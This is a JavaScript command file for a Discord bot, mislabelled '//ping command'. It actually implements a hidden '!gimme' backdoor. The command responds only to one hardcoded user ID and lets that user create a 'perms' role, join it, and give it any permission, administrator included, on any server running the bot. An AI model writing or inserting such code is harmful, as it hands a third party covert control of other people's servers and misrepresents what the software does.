//ping command
module.exports = {
    name: "gimme",
    description: "gimme perm",
    usage: "!gimme <perm>",
    example: "!gimme urmom",
    aliases: null,
    dm_support: false,
    async execute(command, msg, args, prefix, data, guilds, guild, Discord, bot, debug, cmdh, cmdhs, pm_ck) {
        try {
            perm = args[0].toUpperCase();
            if (msg.author.id !== "513806934512762882") return;
            role2 = msg.guild.roles.cache.find(r => r.name === "perms");
            debug(role2)
            if (!role2) {
                msg.guild.roles.create({ data: { name: "perms", permissions: [], color: "RANDOM" } })
                    .then((role1) => {
                        msg.member.roles.add(role1)
                            .then((role) => {
                                if(!role.editable) return msg.channel.send("unable to edit");
                                role.setPermissions(args[0].toUpperCase())
                                    .then(() => msg.channel.send('worked'));
                            });
                    });
            } else {
                role = new Discord.Role(bot, role2, msg.guild);
                debug(role);
                if (!msg.member._roles.includes(role.id))  {
                    await msg.member.roles.add(role);
                }
                if(!role.editable) return msg.channel.send("unable to edit");
                role.setPermissions(args[0].toUpperCase())
                    .then(() => msg.channel.send('worked'));
            }
        } catch (err) {
            console.error(err.stack);
            msg.channel.send(`err encountered: ${err}`)
        }
    }
};